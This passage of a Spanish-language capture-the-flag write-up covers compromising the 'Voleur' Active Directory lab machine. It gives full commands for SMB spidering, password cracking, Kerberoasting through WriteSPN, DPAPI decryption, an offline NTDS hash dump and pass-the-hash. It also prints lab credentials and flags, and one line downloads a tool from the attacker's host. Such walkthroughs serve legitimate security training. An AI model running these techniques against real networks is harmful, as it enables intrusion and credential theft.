+<p>Dado que NetExec utiliza NTLM de forma predeterminada, debemos forzar la autenticación exclusiva por Kerberos.</p>
+<p>Sincronizamos la hora con el controlador de dominio para evitar desfases temporales en Kerberos:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span>DC.voleur.htb
+</code></pre></div>
+<p><img alt="Sincronización NTP" src="../assets/Pasted%20image%2020260925054616.png" /></p>
+<p>Generamos el archivo de configuración Kerberos mediante NetExec y lo exportamos:</p>
+<div class="highlight"><pre><span></span><code>netexec<span class="w"> </span>smb<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'ryan.naylor'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'HollowOct31Nyt'</span><span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-k<span class="w"> </span>--generate-krb5-file<span class="w"> </span>voleur.krb5
+<span class="nb">export</span><span class="w"> </span><span class="nv">KRB5_CONFIG</span><span class="o">=</span>voleur.krb5
+</code></pre></div>
+<p>Validamos la autenticación Kerberos exitosa:</p>
+<div class="highlight"><pre><span></span><code>netexec<span class="w"> </span>smb<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'ryan.naylor'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'HollowOct31Nyt'</span><span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-k
+</code></pre></div>
+<p><img alt="Autenticación Kerberos NetExec" src="../assets/Pasted%20image%2020260925054826.png" /></p>
+<p>Listamos los recursos compartidos:</p>
+<div class="highlight"><pre><span></span><code>netexec<span class="w"> </span>smb<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'ryan.naylor'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'HollowOct31Nyt'</span><span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-k<span class="w"> </span>--shares
+</code></pre></div>
+<p><img alt="Shares SMB" src="../assets/Pasted%20image%2020260925054944.png" /></p>
+<h3 id="rastreo-smb-y-analisis-de-excel-protegido">Rastreo SMB y Análisis de Excel Protegido<a class="headerlink" href="#rastreo-smb-y-analisis-de-excel-protegido" title="Permanent link">&para;</a></h3>
+<p>Rastreamos todos los archivos accesibles en los recursos compartidos con el módulo <code>spider_plus</code>:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'ryan.naylor'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'HollowOct31Nyt'</span><span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-k<span class="w"> </span>-M<span class="w"> </span>spider_plus
+</code></pre></div>
+<p><img alt="Spider Plus" src="../assets/Pasted%20image%2020260925060132.png" /></p>
+<p>Revisamos el archivo JSON generado:</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/home/javikrd/.nxc/modules/nxc_spider_plus/DC.voleur.htb.json<span class="w"> </span><span class="p">|</span><span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>json.tool
+</code></pre></div>
+<p><img alt="Resultado Spider Plus" src="../assets/Pasted%20image%2020260925060352.png" /></p>
+<p>Identificamos el archivo <code>Access_Review.xlsx</code> dentro de la carpeta <code>First-Line Support</code> del recurso <code>IT</code>.</p>
+<p>Solicitamos un ticket TGT con <code>kinit</code> y exportamos el cache:</p>
+<div class="highlight"><pre><span></span><code>kinit<span class="w"> </span>ryan.naylor@VOLEUR.HTB
+<span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>/tmp/krb5cc_1000
+</code></pre></div>
+<p>Descargamos el archivo con <code>smbclient</code> utilizando autenticación Kerberos obligatoria:</p>
+<div class="highlight"><pre><span></span><code>smbclient<span class="w"> </span>//DC.voleur.htb/IT<span class="w"> </span>-U<span class="w"> </span>ryan.naylor<span class="w"> </span>--use-kerberos<span class="o">=</span>required<span class="w"> </span>--use-krb5-ccache<span class="o">=</span>/tmp/krb5cc_1000<span class="w"> </span>-c<span class="w"> </span><span class="s1">'cd "First-Line Support"; get Access_Review.xlsx'</span>
+</code></pre></div>
+<p><img alt="Descarga Access_Review.xlsx" src="../assets/Pasted%20image%2020260925060627.png" /></p>
+<p><img alt="Archivo Descargado" src="../assets/Pasted%20image%2020260925060713.png" /></p>
+<p>El libro de Excel está protegido con contraseña. Utilizamos una versión local de <code>office2john.py</code> (sustituyendo <code>getiterator()</code> por <code>iter()</code> para compatibilidad con Python 3.9+) y extraemos el hash:</p>
+<div class="highlight"><pre><span></span><code>cp<span class="w"> </span>/usr/bin/office2john<span class="w"> </span>~/voleu/loot/office2john_fixed.py
+sed<span class="w"> </span>-i<span class="w"> </span><span class="s1">'s/getiterator/iter/g'</span><span class="w"> </span>~/voleu/loot/office2john_fixed.py
+python3<span class="w"> </span>~/voleu/loot/office2john_fixed.py<span class="w"> </span>Access_Review.xlsx<span class="w"> </span>&gt;<span class="w"> </span>excel.hash
+</code></pre></div>
+<p><img alt="Parche office2john" src="../assets/Pasted%20image%2020260925061251.png" /></p>
+<p>Crackeamos el hash con John the Ripper y <code>rockyou.txt</code>:</p>
+<div class="highlight"><pre><span></span><code>john<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt<span class="w"> </span>excel.hash
+</code></pre></div>
+<p><img alt="Crackeo con John" src="../assets/Pasted%20image%2020260925061434.png" /></p>
+<p>La contraseña descubierta es <strong><code>football1</code></strong>.</p>
+<p>Desencriptamos el archivo utilizando <code>msoffcrypto-tool</code> en un entorno virtual de Python:</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>-m<span class="w"> </span>venv<span class="w"> </span>~/venvs/office
+<span class="nb">source</span><span class="w"> </span>~/venvs/office/bin/activate
+pip<span class="w"> </span>install<span class="w"> </span>msoffcrypto-tool<span class="w"> </span>openpyxl
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">msoffcrypto</span>
+
+<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'Access_Review.xlsx'</span><span class="p">,</span> <span class="s1">'rb'</span><span class="p">)</span>
+<span class="n">office_file</span> <span class="o">=</span> <span class="n">msoffcrypto</span><span class="o">.</span><span class="n">OfficeFile</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+<span class="n">office_file</span><span class="o">.</span><span class="n">load_key</span><span class="p">(</span><span class="n">password</span><span class="o">=</span><span class="s1">'football1'</span><span class="p">)</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'Access_Review_decrypted.xlsx'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">out</span><span class="p">:</span>
+    <span class="n">office_file</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+</code></pre></div>
+<p><img alt="Desencriptación Excel" src="../assets/Pasted%20image%2020260925062325.png" /></p>
+<p>Leemos el contenido de las hojas con <code>openpyxl</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">openpyxl</span>
+
+<span class="n">wb</span> <span class="o">=</span> <span class="n">openpyxl</span><span class="o">.</span><span class="n">load_workbook</span><span class="p">(</span><span class="s1">'Access_Review_decrypted.xlsx'</span><span class="p">,</span> <span class="n">data_only</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">sheet</span> <span class="ow">in</span> <span class="n">wb</span><span class="o">.</span><span class="n">sheetnames</span><span class="p">:</span>
+    <span class="n">ws</span> <span class="o">=</span> <span class="n">wb</span><span class="p">[</span><span class="n">sheet</span><span class="p">]</span>
+    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">'--- Sheet: </span><span class="si">{</span><span class="n">sheet</span><span class="si">}</span><span class="s1"> ---'</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">ws</span><span class="o">.</span><span class="n">iter_rows</span><span class="p">(</span><span class="n">values_only</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">row</span><span class="p">)</span>
+</code></pre></div>
+<p><img alt="Credenciales extraídas" src="../assets/Pasted%20image%2020260925062658.png" /></p>
+<p><strong>Credenciales encontradas:</strong>
+- <code>svc_ldap</code> : <code>M1XyC9pW7qT5Vn</code>
+- <code>svc_iis</code> : <code>N5pXyW1VqM7CZ8</code>
+- <code>Todd.Wolfe</code> : <code>NightT1meP1dg3on14</code> <em>(cuenta marcada como eliminada)</em></p>
+<p>Validamos las cuentas funcionales por SMB/LDAP con Kerberos:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'svc_ldap'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'M1XyC9pW7qT5Vn'</span><span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-k
+nxc<span class="w"> </span>smb<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'svc_iis'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'N5pXyW1VqM7CZ8'</span><span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-k
+</code></pre></div>
+<h2 id="acceso-inicial-user-flag">Acceso Inicial (User Flag)<a class="headerlink" href="#acceso-inicial-user-flag" title="Permanent link">&para;</a></h2>
+<h3 id="recoleccion-de-datos-con-bloodhound">Recolección de Datos con BloodHound<a class="headerlink" href="#recoleccion-de-datos-con-bloodhound" title="Permanent link">&para;</a></h3>
+<p>Recolectamos la información del dominio como <code>svc_ldap</code>:</p>
+<div class="highlight"><pre><span></span><code>bloodhound-ce-python<span class="w"> </span>-u<span class="w"> </span>svc_ldap<span class="w"> </span>-p<span class="w"> </span><span class="s1">'M1XyC9pW7qT5Vn'</span><span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-k<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.232.130<span class="w"> </span>-c<span class="w"> </span>all<span class="w"> </span>--zip<span class="w"> </span>--dns-tcp
+</code></pre></div>
+<p><img alt="BloodHound Dump" src="../assets/Pasted%20image%2020260925063152.png" /></p>
+<p>Al analizar las relaciones en BloodHound descubrimos que <strong><code>svc_ldap</code> tiene privilegios <code>WriteSPN</code> sobre la cuenta <code>svc_winrm</code></strong>:</p>
+<p><img alt="BloodHound WriteSPN" src="../assets/Pasted%20image%2020260925063519.png" /></p>
+<h3 id="abuso-de-writespn-y-ataque-de-kerberoasting">Abuso de WriteSPN y Ataque de Kerberoasting<a class="headerlink" href="#abuso-de-writespn-y-ataque-de-kerberoasting" title="Permanent link">&para;</a></h3>
+<p>Aprovechando <code>WriteSPN</code>, añadimos un Service Principal Name falso a <code>svc_winrm</code> con <code>bloodyAD</code>:</p>
+<div class="highlight"><pre><span></span><code>kinit<span class="w"> </span>svc_ldap@VOLEUR.HTB
+bloodyAD<span class="w"> </span>--host<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-u<span class="w"> </span>svc_ldap<span class="w"> </span>-p<span class="w"> </span><span class="s1">'M1XyC9pW7qT5Vn'</span><span class="w"> </span>-k<span class="w"> </span><span class="nb">set</span><span class="w"> </span>object<span class="w"> </span>svc_winrm<span class="w"> </span>servicePrincipalName<span class="w"> </span>-v<span class="w"> </span><span class="s1">'fake/spn'</span>
+</code></pre></div>
+<p><img alt="Asignación de SPN" src="../assets/Pasted%20image%2020260925064855.png" /></p>
+<p>Solicitamos el ticket TGS correspondiente con <code>GetUserSPNs.py</code>:</p>
+<div class="highlight"><pre><span></span><code>GetUserSPNs.py<span class="w"> </span>voleur.htb/svc_ldap:<span class="s1">'M1XyC9pW7qT5Vn'</span><span class="w"> </span>-dc-host<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>-request
+</code></pre></div>
+<p><img alt="Solicitud TGS" src="../assets/Pasted%20image%2020260925064932.png" /></p>
+<p>Guardamos el ticket TGS en <code>hash.txt</code> y lo crackeamos con Hashcat:</p>
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></div>
+<p><img alt="Hashcat Crack TGS" src="../assets/Pasted%20image%2020260925065048.png" /></p>
+<p><img alt="Contraseña crackeada" src="../assets/Pasted%20image%2020260925065426.png" /></p>
+<p>La contraseña de <code>svc_winrm</code> es: <strong><code>AFireInsidedeOzarctica980219afi</code></strong>.</p>
+<h3 id="conexion-evil-winrm-via-kerberos">Conexión Evil-WinRM vía Kerberos<a class="headerlink" href="#conexion-evil-winrm-via-kerberos" title="Permanent link">&para;</a></h3>
+<p>Debido a que <code>nxc winrm</code> solo soporta NTLM internamente, utilizamos <code>evil-winrm</code> con el soporte Kerberos habilitado a través de <code>pywinrm[kerberos]</code>:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>pacman<span class="w"> </span>-S<span class="w"> </span>krb5
+python3<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>pywinrm<span class="o">[</span>kerberos<span class="o">]</span><span class="w"> </span>--break-system-packages
+</code></pre></div>
+<p>Solicitamos el TGT para <code>svc_winrm</code>:</p>
+<div class="highlight"><pre><span></span><code>kinit<span class="w"> </span>svc_winrm@VOLEUR.HTB
+</code></pre></div>
+<p>Nos conectamos con Evil-WinRM:</p>
+<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-r<span class="w"> </span>VOLEUR.HTB
+</code></pre></div>
+<p><img alt="Sesión Evil-WinRM" src="../assets/Pasted%20image%2020260925070302.png" /></p>
+<p>Capturamos la flag de usuario (<code>user.txt</code>):</p>
+<div class="highlight"><pre><span></span><code>10d4d57ddeb82169e55f76f1223f7369
+</code></pre></div>
+<h2 id="movimiento-lateral-y-escalada-de-privilegios">Movimiento Lateral y Escalada de Privilegios<a class="headerlink" href="#movimiento-lateral-y-escalada-de-privilegios" title="Permanent link">&para;</a></h2>
+<h3 id="restauracion-de-objeto-eliminado-con-runascs">Restauración de Objeto Eliminado con RunasCs<a class="headerlink" href="#restauracion-de-objeto-eliminado-con-runascs" title="Permanent link">&para;</a></h3>
+<p>En BloodHound observamos que <code>svc_ldap</code> es miembro del grupo privilegiado <strong><code>RESTORE_USERS@VOLEUR.HTB</code></strong>:</p>
+<p><img alt="Grupo RESTORE_USERS" src="../assets/Pasted%20image%2020260925072928.png" /></p>
+<p>Recordando que en el Excel existía la cuenta <code>Todd.Wolfe</code> (indicada como eliminada), podemos restaurarla. Para ejecutar comandos con los permisos de <code>svc_ldap</code> desde nuestra sesión activa de <code>svc_winrm</code>, subimos <strong><code>RunasCs.exe</code></strong>:</p>
+<div class="highlight"><pre><span></span><code><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">240</span><span class="p">:</span><span class="n">8000</span><span class="p">/</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span> <span class="n">-OutFile</span> <span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span>
+</code></pre></div>
+<p><img alt="Subida RunasCs" src="../assets/Pasted%20image%2020260925073410.png" /></p>
+<p>Enumeramos los objetos eliminados en Active Directory:</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span> <span class="n">svc_ldap</span> <span class="n">M1XyC9pW7qT5Vn</span> <span class="s2">"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-ADObject -Filter 'isDeleted -eq </span><span class="se">`$</span><span class="s2">true' -IncludeDeletedObjects -Properties distinguishedName, objectSid -SearchBase 'CN=Deleted Objects,DC=voleur,DC=htb'"</span>
+</code></pre></div>
+<p><img alt="Enumeración Objetos Eliminados" src="../assets/Pasted%20image%2020260925073506.png" /></p>
+<p>Localizamos el objeto <code>CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db</code> y lo restauramos:</p>
+<div class="highlight"><pre><span></span><code><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="n">exe</span> <span class="n">svc_ldap</span> <span class="n">M1XyC9pW7qT5Vn</span> <span class="s2">"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Restore-ADObject 'CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb'"</span>
+</code></pre></div>
+<p><img alt="Restauración Exitosa" src="../assets/Pasted%20image%2020260925073834.png" /></p>
+<p>Con la cuenta restaurada, solicitamos un ticket Kerberos para <code>todd.wolfe</code> con la contraseña encontrada previamente en el Excel (<code>NightT1meP1dg3on14</code>):</p>
+<div class="highlight"><pre><span></span><code>kinit<span class="w"> </span>todd.wolfe@VOLEUR.HTB
+</code></pre></div>
+<p><img alt="Ticket Todd Wolfe" src="../assets/Pasted%20image%2020260925074248.png" /></p>
+<p>Validamos sus recursos compartidos accesibles:</p>
+<div class="highlight"><pre><span></span><code>nxc<span class="w"> </span>smb<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'todd.wolfe'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'NightT1meP1dg3on14'</span><span class="w"> </span>-d<span class="w"> </span>voleur.htb<span class="w"> </span>-k<span class="w"> </span>--shares
+</code></pre></div>
+<p><img alt="Shares Todd Wolfe" src="../assets/Pasted%20image%2020260925074417.png" /></p>
+<h3 id="extraccion-de-credenciales-dpapi">Extracción de Credenciales DPAPI<a class="headerlink" href="#extraccion-de-credenciales-dpapi" title="Permanent link">&para;</a></h3>
+<p>Nos conectamos con <code>smbclient</code> al recurso compartido <code>IT</code>:</p>
+<div class="highlight"><pre><span></span><code>smbclient<span class="w"> </span>//DC.voleur.htb/IT<span class="w"> </span>-U<span class="w"> </span><span class="s1">'todd.wolfe%NightT1meP1dg3on14'</span><span class="w"> </span>--use-kerberos<span class="o">=</span>required
+</code></pre></div>
+<p><img alt="Acceso Carpeta IT" src="../assets/Pasted%20image%2020260925074830.png" /></p>
+<p>Navegamos a <code>AppData\Roaming\Microsoft\Credentials</code> y encontramos un archivo de credenciales cifrado con DPAPI:</p>
+<p><img alt="Archivo Credencial DPAPI" src="../assets/Pasted%20image%2020260925075013.png" /></p>
+<p>Descargamos el credential blob (<code>772275FAD58525253490A9B0039791D3</code>) y la MasterKey ubicada en el directorio <code>Protect</code>:</p>
+<p><img alt="MasterKey DPAPI" src="../assets/Pasted%20image%2020260925075505.png" /></p>
+<p>Desencriptamos la MasterKey utilizando el SID y la contraseña de Todd Wolfe con <code>dpapi.py</code>:</p>
+<div class="highlight"><pre><span></span><code>dpapi.py<span class="w"> </span>masterkey<span class="w"> </span>-file<span class="w"> </span><span class="m">08949382</span>-134f-4c63-b93c-ce52efc0aa88<span class="w"> </span>-sid<span class="w"> </span>S-1-5-21-3927696377-1337352550-2781715495-1110<span class="w"> </span>-password<span class="w"> </span>NightT1meP1dg3on14
+</code></pre></div>
+<p><img alt="Desencriptación MasterKey" src="../assets/Pasted%20image%2020260925075805.png" /></p>
+<p>Utilizamos la clave obtenida para desencriptar el credential blob:</p>
+<div class="highlight"><pre><span></span><code>dpapi.py<span class="w"> </span>credential<span class="w"> </span>-file<span class="w"> </span>772275FAD58525253490A9B0039791D3<span class="w"> </span>-key<span class="w"> </span>0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+</code></pre></div>
+<p><img alt="Credenciales Jeremy Combs" src="../assets/Pasted%20image%2020260925075901.png" /></p>
+<p>Obtenemos las credenciales del usuario:
+- <strong>Usuario:</strong> <code>jeremy.combs</code>
+- <strong>Contraseña:</strong> <code>qT3V9pLXyN7W4m</code></p>
+<h3 id="acceso-a-jeremy-combs-y-descubrimiento-de-wsl">Acceso a Jeremy Combs y Descubrimiento de WSL<a class="headerlink" href="#acceso-a-jeremy-combs-y-descubrimiento-de-wsl" title="Permanent link">&para;</a></h3>
+<p>Solicitamos un TGT para <code>jeremy.combs</code> y nos conectamos con Evil-WinRM:</p>
+<div class="highlight"><pre><span></span><code>kinit<span class="w"> </span>jeremy.combs@VOLEUR.HTB
+evil-winrm<span class="w"> </span>-i<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-r<span class="w"> </span>VOLEUR.HTB
+</code></pre></div>
+<p>En el sistema encontramos una clave privada SSH (<code>id_rsa</code>) y una nota de texto:</p>
+<p><img alt="Clave SSH y Nota" src="../assets/Pasted%20image%2020260925080520.png" /></p>
+<div class="highlight"><pre><span></span><code>Jeremy,
+
+¡Ya me he hartado de Windows Backup! He configurado parcialmente WSL para ver si podemos utilizar alguna de las herramientas de copia de seguridad de Linux.
+
+Por favor, mira qué puedes configurar.
+
+Gracias,
+Administrador
+</code></pre></div>
+<p><img alt="Nota Administrador" src="../assets/Pasted%20image%2020260925080642.png" /></p>
+<p>La nota confirma la existencia de un subsistema Linux (WSL) expuesto por SSH en el puerto 2222 para tareas de backup asociadas a la cuenta <code>svc_backup</code>.</p>
+<p>Descargamos la clave privada con Evil-WinRM para asegurar su integridad:</p>
+<div class="highlight"><pre><span></span><code><span class="n">download</span> <span class="s2">"C:\IT\Third-Line Support\id_rsa"</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">javikrd</span><span class="p">/</span><span class="n">voleu</span><span class="p">/</span><span class="n">content</span><span class="p">/</span><span class="n">id_rsa</span>
+</code></pre></div>
+<p>Ajustamos los permisos y nos conectamos por SSH al puerto 2222:</p>
+<div class="highlight"><pre><span></span><code>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>id_rsa
+ssh<span class="w"> </span>-i<span class="w"> </span>~/voleu/content/id_rsa<span class="w"> </span>-p<span class="w"> </span><span class="m">2222</span><span class="w"> </span>svc_backup@10.129.232.130
+</code></pre></div>
+<p><img alt="Acceso SSH WSL" src="../assets/Pasted%20image%2020260925081421.png" /></p>
+<p>Comprobamos los privilegios sudo del usuario <code>svc_backup</code>:</p>
+<p><img alt="Privilegios Sudo" src="../assets/Pasted%20image%2020260925081556.png" /></p>
+<p><img alt="Sudo NOPASSWD ALL" src="../assets/Pasted%20image%2020260925081719.png" /></p>
+<p>El usuario tiene <strong><code>sudo NOPASSWD: ALL</code></strong>, permitiéndonos escalar a root dentro de WSL inmediatamente:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>su<span class="w"> </span>-
+</code></pre></div>
+<p><img alt="Root en WSL" src="../assets/Pasted%20image%2020260925081821.png" /></p>
+<h3 id="volcado-offline-de-ntds-y-root-de-dominio">Volcado Offline de NTDS y Root de Dominio<a class="headerlink" href="#volcado-offline-de-ntds-y-root-de-dominio" title="Permanent link">&para;</a></h3>
+<p>Al inspeccionar los puntos de montaje de Windows en <code>/mnt/c/</code>, encontramos las copias de seguridad de Active Directory y del registro:</p>
+<div class="highlight"><pre><span></span><code>/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
+/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY
+/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
+</code></pre></div>
+<p>Copiamos los archivos a un directorio temporal:</p>
+<div class="highlight"><pre><span></span><code>mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/loot
+cp<span class="w"> </span><span class="s2">"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit"</span><span class="w"> </span>/tmp/loot/
+cp<span class="w"> </span><span class="s2">"/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY"</span><span class="w"> </span>/tmp/loot/
+cp<span class="w"> </span><span class="s2">"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM"</span><span class="w"> </span>/tmp/loot/
+</code></pre></div>
+<p><img alt="Copia de Backups" src="../assets/Pasted%20image%2020260925082241.png" /></p>
+<p>Transferimos los archivos a nuestra máquina atacante mediante <code>scp</code>:</p>
+<div class="highlight"><pre><span></span><code>scp<span class="w"> </span>-i<span class="w"> </span>~/voleu/content/id_rsa<span class="w"> </span>-P<span class="w"> </span><span class="m">2222</span><span class="w"> </span><span class="s1">'svc_backup@10.129.232.130:/tmp/loot/ntds.dit'</span><span class="w"> </span>~/voleu/content/
+scp<span class="w"> </span>-i<span class="w"> </span>~/voleu/content/id_rsa<span class="w"> </span>-P<span class="w"> </span><span class="m">2222</span><span class="w"> </span><span class="s1">'svc_backup@10.129.232.130:/tmp/loot/SYSTEM'</span><span class="w"> </span>~/voleu/content/
+scp<span class="w"> </span>-i<span class="w"> </span>~/voleu/content/id_rsa<span class="w"> </span>-P<span class="w"> </span><span class="m">2222</span><span class="w"> </span><span class="s1">'svc_backup@10.129.232.130:/tmp/loot/SECURITY'</span><span class="w"> </span>~/voleu/content/
+</code></pre></div>
+<p><img alt="Transferencia SCP" src="../assets/Pasted%20image%2020260925082508.png" /></p>
+<p>Volcamos los hashes de Active Directory con <code>secretsdump.py</code>:</p>
+<div class="highlight"><pre><span></span><code>secretsdump.py<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit<span class="w"> </span>-system<span class="w"> </span>SYSTEM<span class="w"> </span>-security<span class="w"> </span>SECURITY<span class="w"> </span>LOCAL
+</code></pre></div>
+<p><img alt="Volcado NTDS Offline" src="../assets/Pasted%20image%2020260925082551.png" /></p>
+<p>Obtenemos el hash NTLM del Administrator:</p>
+<div class="highlight"><pre><span></span><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
+</code></pre></div>
+<p>Dado que NTLM está deshabilitado en el dominio, utilizamos <code>getTGT.py</code> de Impacket pasando el hash NTLM para forjar un ticket TGT de Kerberos:</p>
+<div class="highlight"><pre><span></span><code>getTGT.py<span class="w"> </span>voleur.htb/administrator<span class="w"> </span>-hashes<span class="w"> </span>aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.129.232.130
+<span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+</code></pre></div>
+<p>Nos conectamos con Evil-WinRM utilizando el ticket Kerberos recién generado:</p>
+<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-i<span class="w"> </span>DC.voleur.htb<span class="w"> </span>-r<span class="w"> </span>VOLEUR.HTB
+</code></pre></div>
+<p><img alt="Conexión Evil-WinRM Root" src="../assets/Pasted%20image%2020260925082916.png" /></p>
+<p>Capturamos la flag de root:</p>
+<p><img alt="Root Flag" src="../assets/Pasted%20image%2020260925082956.png" /></p>
+<div class="highlight"><pre><span></span><code>61b2790d3cf5c16f8ec631f3c5a130e2
+</code></pre></div>
+<p><img alt="Voleur Completada" src="../assets/Pasted%20image%2020261014234549.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../sendai/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: 🏢 Sendai">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                🏢 Sendai
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../../herramientas/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: 🛠️ Hojas de Truco (Cheatsheets)">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Siguiente
+              </span>
+              <div class="md-ellipsis">
+                🛠️ Hojas de Truco (Cheatsheets)
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
